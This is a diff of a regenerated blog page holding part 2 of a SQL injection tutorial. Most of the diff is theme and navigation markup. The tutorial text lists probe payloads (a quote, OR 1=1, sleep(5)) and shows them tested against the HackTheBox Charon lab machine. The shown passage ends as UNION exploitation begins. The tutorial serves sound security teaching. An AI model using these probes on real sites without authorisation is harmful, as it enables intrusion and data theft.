@@ -14,6 +14,16 @@
 
 
 
+
+
+
+
+
+
+
+
+
+
 <!DOCTYPE html>
 <html lang='en-us'><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
     <meta charset="utf-8">
@@ -26,25 +36,29 @@
     
 
     
-    <meta name="author" content="karan bhayani" />
+    <meta name="author" content="nomi bhayani" />
     
 
     
-        <meta property="og:title" content="SQL Injection 0x02 - Testing and UNION Attacks" />
-<meta property="og:description" content="SQL Injection 0x02 - Testing and UNION Attacks Introduction Hi, welcome to the second post of the sql injection series, if you haven&rsquo;t read the first part of the series, you can read it here.
-In this post I have focused on how to perform testing for error-based SQL injection and then moved on to a general process of performing UNION attacks. I have also covered how you can automate data extraction when the amount of data you are dealing with is a lot." />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="http://localhost:1313/sqli-0x02/" /><meta property="article:section" content="" />
-<meta property="article:published_time" content="2020-07-10T22:31:47+00:00" />
-<meta property="article:modified_time" content="2020-07-10T22:31:47+00:00" />
-
+        <meta property="og:url" content="http://localhost:1313/sqli-0x02/">
+  <meta property="og:site_name" content="Welcome to noobsec">
+  <meta property="og:title" content="SQL Injection 0x02 - Testing and UNION Attacks">
+  <meta property="og:description" content="SQL Injection 0x02 - Testing and UNION AttacksIntroductionHi, welcome to the second post of the sql injection series, if you haven’t read the first part of the series, you can read it here.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:published_time" content="2020-07-10T22:31:47+00:00">
+    <meta property="article:modified_time" content="2020-07-10T22:31:47+00:00">
+    <meta property="article:tag" content="Sqli">
+    <meta property="article:tag" content="Sql Injeciton">
+    <meta property="article:tag" content="Web Attacks">
 
     
 
     
-        <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="SQL Injection 0x02 - Testing and UNION Attacks"/>
-<meta name="twitter:description" content="SQL Injection 0x02 - Testing and UNION Attacks Introduction Hi, welcome to the second post of the sql injection series, if you haven&rsquo;t read the first part of the series, you can read it here.
-In this post I have focused on how to perform testing for error-based SQL injection and then moved on to a general process of performing UNION attacks. I have also covered how you can automate data extraction when the amount of data you are dealing with is a lot."/>
+        
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="SQL Injection 0x02 - Testing and UNION Attacks">
+  <meta name="twitter:description" content="SQL Injection 0x02 - Testing and UNION AttacksIntroductionHi, welcome to the second post of the sql injection series, if you haven’t read the first part of the series, you can read it here.">
 
     <link rel="stylesheet" href="/style.css" integrity="">
 
@@ -54,18 +68,20 @@ In this post I have focused on how to perform testing for error-based SQL inject
 
 
         
-<script>
-var doNotTrack = false;
-if (!doNotTrack) {
-	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
-	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
-	ga('create', 'UA-171056200-1', 'auto');
-	
-	ga('send', 'pageview');
-}
-</script>
+      <script async src="https://www.googletagmanager.com/gtag/js?id=G-VZX99LLTQ8"></script>
+      <script>
+        var doNotTrack = false;
+        if ( false ) {
+          var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
+          var doNotTrack = (dnt == "1" || dnt == "yes");
+        }
+        if (!doNotTrack) {
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments);}
+          gtag('js', new Date());
+          gtag('config', 'G-VZX99LLTQ8');
+        }
+      </script>
     
 
     
@@ -80,7 +96,13 @@ if (!doNotTrack) {
             document.documentElement.setAttribute("data-theme", "light");
         }
     </script>
-<script defer src="/js/header.js" integrity=""></script>
+<script defer src="/js/theme-switch.js" integrity=""></script>
+
+
+
+    <script defer src="/js/hide-navbar-on-scroll.js" integrity=""></script>
+
+
 
 
 
@@ -117,98 +139,263 @@ if (!doNotTrack) {
 
 
 
+
+    
 </head>
-<body>
-        <main><header>
-    <div class="brand">
-        <div id="sidebar_btn">
-            <svg id="menu_icon" width="26px" height="26px" viewBox="0 0 24 24">
+<body><header>
+    <div id="header_content" class="wide">
+        <div id="header_left">
+            <div id="sidebar_btn">
+                <input type="checkbox" id="sidebar_btn_input" class="hidden" />
+                <label id="sidebar_btn_label" for="sidebar_btn_input">
 <svg
     xmlns="http://www.w3.org/2000/svg"
-    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    width="24px" height="24px" viewBox="0 0 24 24" fill="none"
     stroke="currentColor" stroke-width="2" stroke-linecap="round"
     stroke-linejoin="round">
     <line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line>
 </svg>
 
-</svg>
-        </div>
-
-        <div>
-            <a href="/">noobsec</a>
-        </div>
-    </div>
-
-    <div class="toolbox">
-        <div id="theme_tool">
-            <svg id="dark_mode_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
-<svg
-    xmlns="http://www.w3.org/2000/svg"
-    width="24" height="24" viewBox="0 0 24 24" fill="none"
-    stroke="currentColor" stroke-width="2" stroke-linecap="round"
-    stroke-linejoin="round">
-    <circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
-</svg>
-
-</svg>
-            <svg id="light_mode_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
-<svg
-    xmlns="http://www.w3.org/2000/svg"
-    width="24" height="24" viewBox="0 0 24 24" fill="none"
-    stroke="currentColor" stroke-width="2" stroke-linecap="round"
-    stroke-linejoin="round">
-    <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
-</svg>
-
-</svg>
-        </div>
-
+</label>
+                <label id="sidebar_canvas_overlay_wrapper" for="sidebar_btn_input">
+                    <div id="sidebar_canvas_overlay"></div>
+                </label>
+                <div id="sidebar">
+                    <ul><li>
+                                <a href="#">OSCP</a>
+    <ul>
         
-            <div id="search_tool">
-                <svg id="search_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
-<svg
-    xmlns="http://www.w3.org/2000/svg"
-    width="24" height="24" viewBox="0 0 24 24" fill="none"
-    stroke="currentColor" stroke-width="2" stroke-linecap="round"
-    stroke-linejoin="round">
-    <circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line>
-</svg>
 
-</svg><div id="search_menu_wrapper" class="hidden">
-    <div id="search_menu">
-        <div id="search_menu_toolbar">
-            <div id="search_menu_input_wrapper">
-                <input id="search_menu_input" type="text" placeholder='Search Posts'>
+            
+                <li>
+                    
+                        <a href="/oscp-cheatsheet">OSCP Cheatsheet</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/privesc-linux">Linux PrivEsc Cheatsheet</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/privesc-windows">Windows PrivEsc Cheatsheet</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/ad-cheatsheet">OSCP AD Cheatsheet</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/oscp-journey">OSCP Journey</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/bof">OSCP BOF</a>
+                    
+                </li>
+            
+        
+    </ul>
+</li><li>
+                                <a href="#">HTB</a>
+    <ul>
+        
+
+            
+                <li>
+                    
+                        <a href="/hackthebox/htb-bart">HTB Bart</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/hackthebox/htb-falafel-writeup-w-o-metasploit">HTB Falafel</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/hackthebox/htb-cronos">HTB Cronos</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/hackthebox/htb-bashed">HTB Bashed</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/hackthebox/htb-lame">HTB Lame</a>
+                    
+                </li>
+            
+        
+    </ul>
+</li><li>
+                                <a href="#">Web Attacks</a>
+    <ul>
+        
+
+            
+                <li>
+                    
+                        <a href="/file-inclusion">File Inclusion</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/sqli-0x01">SQLi 0x01</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/sqli-0x02">SQLi 0x02</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/sqli-0x03">SQLi 0x03</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/sqli-cheatsheet">SQLi Cheatsheet</a>
+                    
+                </li>
+            
+        
+    </ul>
+</li><li>
+                                <a href="#">Cheatsheets</a>
+    <ul>
+        
+
+            
+                <li>
+                    
+                        <a href="/oscp-cheatsheet">OSCP Cheatsheet</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/privesc-linux">Linux PrivEsc Cheatsheet</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/privesc-windows">Windows PrivEsc Cheatsheet</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/ad-cheatsheet">AD Cheatsheet</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/crtp-cheatsheet">CRTP Cheatsheet</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/sqli-cheatsheet">SQLi Cheatsheet</a>
+                    
+                </li>
+            
+        
+    </ul>
+</li><li>
+                                <a href="/starting-point">Getting Started in Red Team</a></li><li>
+                                <a href="/whoami/">About</a></li></ul>
+                </div>
             </div>
-            <div id="search_menu_close_btn">
-                <svg width="18px" height="18px" viewBox="0 0 24 24">
-<svg
-    xmlns="http://www.w3.org/2000/svg"
-    width="24" height="24" viewBox="0 0 24 24" fill="none"
-    stroke="currentColor" stroke-width="2" stroke-linecap="round"
-    stroke-linejoin="round">
-    <line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line>
-</svg>
-
-</svg>
-            </div>
-        </div>
-        <div id="search_menu_results">
-        </div>
-    </div>
-</div>
-</div>
         
-
-        
-    </div>
-</header>
-<nav id="navbar" class="pure-menu">
-    <ul class="pure-menu-list"><li class="navbar-item navbar-dropdown pure-menu-item pure-menu-has-children pure-menu-allow-hover ">
+            <div class="brand">
+                <div>
+                    <a href="/">noobsec</a>
+                </div>
+            </div><nav id="header_navbar" class="pure-menu header-menu">
+    <ul class="pure-menu-list"><li class="header-menu-item header-menu-dropdown pure-menu-item pure-menu-has-children pure-menu-allow-hover ">
                     
                         <a href="#" class="pure-menu-link">OSCP</a>
                     
                     <ul class="pure-menu-children">
+
     
         <li class="pure-menu-item">
             
@@ -216,6 +403,7 @@ if (!doNotTrack) {
             
         </li>
     
+
 
     
         <li class="pure-menu-item">
@@ -225,6 +413,7 @@ if (!doNotTrack) {
         </li>
     
 
+
     
         <li class="pure-menu-item">
             
@@ -232,6 +421,7 @@ if (!doNotTrack) {
             
         </li>
     
+
 
     
         <li class="pure-menu-item">
@@ -241,6 +431,7 @@ if (!doNotTrack) {
         </li>
     
 
+
     
         <li class="pure-menu-item">
             
@@ -248,6 +439,7 @@ if (!doNotTrack) {
             
         </li>
     
+
 
     
         <li class="pure-menu-item">
@@ -258,11 +450,12 @@ if (!doNotTrack) {
     
 
 </ul>
-                </li><li class="navbar-item navbar-dropdown pure-menu-item pure-menu-has-children pure-menu-allow-hover ">
+                </li><li class="header-menu-item header-menu-dropdown pure-menu-item pure-menu-has-children pure-menu-allow-hover ">
                     
                         <a href="#" class="pure-menu-link">HTB</a>
                     
                     <ul class="pure-menu-children">
+
     
         <li class="pure-menu-item">
             
@@ -270,6 +463,7 @@ if (!doNotTrack) {
             
         </li>
     
+
 
     
         <li class="pure-menu-item">
@@ -279,6 +473,7 @@ if (!doNotTrack) {
         </li>
     
 
+
     
         <li class="pure-menu-item">
             
@@ -287,6 +482,7 @@ if (!doNotTrack) {
         </li>
     
 
+
     
         <li class="pure-menu-item">
             
@@ -294,6 +490,7 @@ if (!doNotTrack) {
             
         </li>
     
+
 
     
         <li class="pure-menu-item">
@@ -304,11 +501,12 @@ if (!doNotTrack) {
     
 
 </ul>
-                </li><li class="navbar-item navbar-dropdown pure-menu-item pure-menu-has-children pure-menu-allow-hover ">
+                </li><li class="header-menu-item header-menu-dropdown pure-menu-item pure-menu-has-children pure-menu-allow-hover ">
                     
                         <a href="#" class="pure-menu-link">Web Attacks</a>
                     
                     <ul class="pure-menu-children">
+
     
         <li class="pure-menu-item">
             
@@ -316,6 +514,7 @@ if (!doNotTrack) {
             
         </li>
     
+
 
     
         <li class="pure-menu-item">
@@ -325,6 +524,7 @@ if (!doNotTrack) {
         </li>
     
 
+
     
         <li class="pure-menu-item">
             
@@ -332,6 +532,7 @@ if (!doNotTrack) {
             
         </li>
     
+
 
     
         <li class="pure-menu-item">
@@ -341,6 +542,7 @@ if (!doNotTrack) {
         </li>
     
 
+
     
         <li class="pure-menu-item">
             
@@ -350,11 +552,12 @@ if (!doNotTrack) {
     
 
 </ul>
-                </li><li class="navbar-item navbar-dropdown pure-menu-item pure-menu-has-children pure-menu-allow-hover ">
+                </li><li class="header-menu-item header-menu-dropdown pure-menu-item pure-menu-has-children pure-menu-allow-hover ">
                     
                         <a href="#" class="pure-menu-link">Cheatsheets</a>
                     
                     <ul class="pure-menu-children">
+
     
         <li class="pure-menu-item">
             
@@ -362,6 +565,7 @@ if (!doNotTrack) {
             
         </li>
     
+
 
     
         <li class="pure-menu-item">
@@ -371,6 +575,7 @@ if (!doNotTrack) {
         </li>
     
 
+
     
         <li class="pure-menu-item">
             
@@ -378,6 +583,7 @@ if (!doNotTrack) {
             
         </li>
     
+
 
     
         <li class="pure-menu-item">
@@ -387,6 +593,7 @@ if (!doNotTrack) {
         </li>
     
 
+
     
         <li class="pure-menu-item">
             
@@ -394,6 +601,7 @@ if (!doNotTrack) {
             
         </li>
     
+
 
     
         <li class="pure-menu-item">
@@ -404,231 +612,88 @@ if (!doNotTrack) {
     
 
 </ul>
-                </li><li class="navbar-item pure-menu-item ">
+                </li><li class="header-menu-item pure-menu-item ">
                     
                         <a href="/starting-point" class="pure-menu-link">Getting Started in Red Team</a>
                     
-                </li><li class="navbar-item pure-menu-item ">
+                </li><li class="header-menu-item pure-menu-item ">
                     
                         <a href="/whoami/" class="pure-menu-link">About</a>
                     
                 </li></ul>
 </nav>
-<div id="sidebar_canvas_overlay" class="hidden"></div>
-<div id="sidebar" class="close">
-    <ul><li>
-                    <details>
-                        <summary><a href="#">OSCP</a></summary>
-    <ul>
-        
+</div>
+
+        <div id="header_right">
             
-                <li>
-                    
-                        <a href="/oscp-cheatsheet">OSCP Cheatsheet</a>
-                    
-                </li>
+
+            <div id="theme_tool">
+                <button id="dark_mode_btn" class="header-menu-btn outline-button" title='Switch to dark mode' type="button">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24px" height="24px" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+</svg>
+
+</button>
+                <button id="light_mode_btn" class="header-menu-btn outline-button" title='Switch to light mode' type="button">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24px" height="24px" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+</svg>
+
+</button>
+            </div>
+
             
-        
+                <div id="search_tool">
+                    <button id="search_btn" class="header-menu-btn outline-button" title='Search Posts' type="button">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24px" height="24px" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line>
+</svg>
+
+</button>
+                </div>
             
-                <li>
-                    
-                        <a href="/privesc-linux">Linux PrivEsc Cheatsheet</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/privesc-windows">Windows PrivEsc Cheatsheet</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/ad-cheatsheet">OSCP AD Cheatsheet</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/oscp-journey">OSCP Journey</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/bof">OSCP BOF</a>
-                    
-                </li>
-            
-        
-    </ul>
-</details>
-                </li><li>
-                    <details>
-                        <summary><a href="#">HTB</a></summary>
-    <ul>
-        
-            
-                <li>
-                    
-                        <a href="/hackthebox/htb-bart">HTB Bart</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/hackthebox/htb-falafel-writeup-w-o-metasploit">HTB Falafel</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/hackthebox/htb-cronos">HTB Cronos</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/hackthebox/htb-bashed">HTB Bashed</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/hackthebox/htb-lame">HTB Lame</a>
-                    
-                </li>
-            
-        
-    </ul>
-</details>
-                </li><li>
-                    <details>
-                        <summary><a href="#">Web Attacks</a></summary>
-    <ul>
-        
-            
-                <li>
-                    
-                        <a href="/file-inclusion">File Inclusion</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/sqli-0x01">SQLi 0x01</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/sqli-0x02">SQLi 0x02</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/sqli-0x03">SQLi 0x03</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/sqli-cheatsheet">SQLi Cheatsheet</a>
-                    
-                </li>
-            
-        
-    </ul>
-</details>
-                </li><li>
-                    <details>
-                        <summary><a href="#">Cheatsheets</a></summary>
-    <ul>
-        
-            
-                <li>
-                    
-                        <a href="/oscp-cheatsheet">OSCP Cheatsheet</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/privesc-linux">Linux PrivEsc Cheatsheet</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/privesc-windows">Windows PrivEsc Cheatsheet</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/ad-cheatsheet">AD Cheatsheet</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/crtp-cheatsheet">CRTP Cheatsheet</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/sqli-cheatsheet">SQLi Cheatsheet</a>
-                    
-                </li>
-            
-        
-    </ul>
-</details>
-                </li><li>
-                    <a href="/starting-point">Getting Started in Red Team</a>
-                </li><li>
-                    <a href="/whoami/">About</a>
-                </li></ul>
-</div><div id="content" class="content-margin">
+        </div>
+    </div>
+</header><div id="search_menu_wrapper" class="hidden">
+    <div id="search_menu">
+        <div id="search_menu_toolbar">
+            <div id="search_menu_input_wrapper">
+                <input id="search_menu_input" type="text" placeholder='Search Posts'>
+            </div>
+            <div id="search_menu_close_btn">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1.25rem" height="1.25rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line>
+</svg>
+
+</div>
+        </div>
+        <div id="search_menu_results">
+        </div>
+    </div>
+</div>
+<main>
+            <div id="content" class="content-margin">
                 
     
-    <details class="collapsible-menu-wrapper"><summary class="collapsible-menu-type"><span>Table of contents</span></summary><div class="collapsible-menu">
+    
+        
+        <details class="collapsible-menu-wrapper"><summary class="collapsible-menu-type"><span>Table of contents</span></summary><div class="collapsible-menu">
         
             <nav id="TableOfContents">
   <ul>
@@ -665,10 +730,12 @@ if (!doNotTrack) {
 </nav>
         
     </div></details>
+    
 
 
 
     <div class="content-margin">
+
 
 
 
@@ -678,12 +745,86 @@ if (!doNotTrack) {
         
         
     
-    <h1 id="sql-injection-0x02---testing-and-union-attacks">SQL Injection 0x02 - Testing and UNION Attacks</h1>
-<h2 id="introduction">Introduction</h2>
+
+    
+    
+        
+        
+        
+    
+        
+        
+            
+            
+            
+        
+        <section id="sql-injection-0x02---testing-and-union-attacks">
+
+
+<h1 class="header-anchor-wrapper">SQL Injection 0x02 - Testing and UNION Attacks
+  <a href="#sql-injection-0x02---testing-and-union-attacks" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h1>
+
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="introduction">
+
+
+<h2 class="header-anchor-wrapper">Introduction
+  <a href="#introduction" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h2>
+
 <p>Hi, welcome to the second post of the sql injection series, if you haven&rsquo;t read the first part of the series, you can read it <a href="/sqli-0x01">here</a>.</p>
 <p>In this post I have focused on how to perform testing for error-based SQL injection and then moved on to a general process of performing UNION attacks. I have also covered how you can automate data extraction when the amount of data you are dealing with is a lot.</p>
 <p>The post contains two classic UNION injection examples from identification to exploitation of the same. Both the examples are separated into their own parts to ensure that a reader of any experience can follow along. At the end of the post I&rsquo;ve put up a small table of new things I&rsquo;ve introduced in this post and what they are. I&rsquo;ve also put up a checklist of steps that you should perform when testing a parameter and when exploiting UNION-based SQL injections.</p>
-<h2 id="vulnerability-identification">Vulnerability Identification</h2>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="vulnerability-identification">
+
+
+<h2 class="header-anchor-wrapper">Vulnerability Identification
+  <a href="#vulnerability-identification" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h2>
+
 <p>To be able to identify all the potential SQL injection points, it&rsquo;s essential that the application and its functionality is browsed through and understood (as much as possible), making note of all the pages and functions that might be interacting with the database, usually PHP, ASPX, or such pages. Some of the example of where an application might be interacting with the database would be:</p>
 <ul>
 <li>authentication forms
@@ -700,7 +841,30 @@ if (!doNotTrack) {
 <li>search engine portal</li>
 </ul>
 <p>Make note of all the user input fields and parameters being passed in requests. These would be the testing points for SQL injection.</p>
-<h2 id="vulnerability-testing">Vulnerability Testing</h2>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="vulnerability-testing">
+
+
+<h2 class="header-anchor-wrapper">Vulnerability Testing
+  <a href="#vulnerability-testing" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h2>
+
 <p>Once all the user input fields and parameters have been identified, each field and parameter needs to be tested individually. This is to ensure that only one object is affecting the backend and will make testing for effective. Along with these, HTTP headers like User-Agent and Cookie should also be on your list to test for. User-Agent and/or cookies might be getting tracked and written onto a table for analytics purposes or tracking users.</p>
 <p>Best way to test is to use something a SQL database would treat it as a part of the query itself.</p>
 <pre  class="mc-prism hide language-text" ><code class="language-SQL">'       # a single quote, treated as a string terminator
@@ -713,7 +877,30 @@ OR 1=1  # an or statement, 1=1 tests for true condition, use 1=2 to test for fal
 sleep(5)# delays the response by the number of seconds mentioned in the sleep command. 
 </code></pre>
 <p>The objective of these tests is for the existing query to return true, false or some kinda subtle changes to the webpage or bring out the errors.</p>
-<h3 id="example-1---blog">Example 1 - Blog</h3>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="example-1---blog">
+
+
+<h3 class="header-anchor-wrapper">Example 1 - Blog
+  <a href="#example-1---blog" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h3>
+
 <p>All examples here are from <a href="https://www.hackthebox.eu/home/machines/profile/42">HackTheBox - Charon</a> machine.</p>
 <p>Normal looking blog post</p>
 <p><img src="/sqli-0x02/1_normal.png" alt="Normal Post"></p>
@@ -762,16 +949,85 @@ At times like those a <code>sleep</code> statement could be passed like <code>id
 <p><img src="/sqli-0x02/7_sleep_3.png" alt="cURL Request With Sleep"></p>
 <p><img src="/sqli-0x02/7_sleep_4.png" alt="Sleep Injection Successful"></p>
 <p>Even with the sleep command we could successfully test that this parameter is vulnerable. Sleep command requires to be used with an operator or a <code>SELECT</code> statement, it cannot be used as-is.</p>
-<h2 id="vulnerability-exploitaion---union-attacks---example-1">Vulnerability Exploitaion - UNION Attacks - Example 1</h2>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="vulnerability-exploitaion---union-attacks---example-1">
+
+
+<h2 class="header-anchor-wrapper">Vulnerability Exploitaion - UNION Attacks - Example 1
+  <a href="#vulnerability-exploitaion---union-attacks---example-1" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h2>
+
 <p>Once an SQL injection has been identified and tested, it is time to exploit it. An SQL injection exploitation is usually used in order to find something juicy - credentials, customer details, credit card numbers.</p>
 <p>This post, as mentioned above, will cover UNION injections. Let&rsquo;s continue with the above example.</p>
-<h3 id="backend-query">Backend Query</h3>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="backend-query">
+
+
+<h3 class="header-anchor-wrapper">Backend Query
+  <a href="#backend-query" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h3>
+
 <p>We&rsquo;ve successfully found that the <code>id</code> parameter is vulnerable to SQL injection. The way the code might be working at the backend would be that the PHP takes the id parameter from a GET request and then passes it to some internal variable, which puts it into a SQL query.
 If we had to guess the query it is executing it could be something like below:</p>
 <pre  class="mc-prism hide language-text" ><code class="language-SQL">SELECT title, author, date, post FROM blogpost WHERE id=11
 </code></pre>
 <p>With this guess we can estimate that this particular table has 5 columns. Let&rsquo;s test it out.</p>
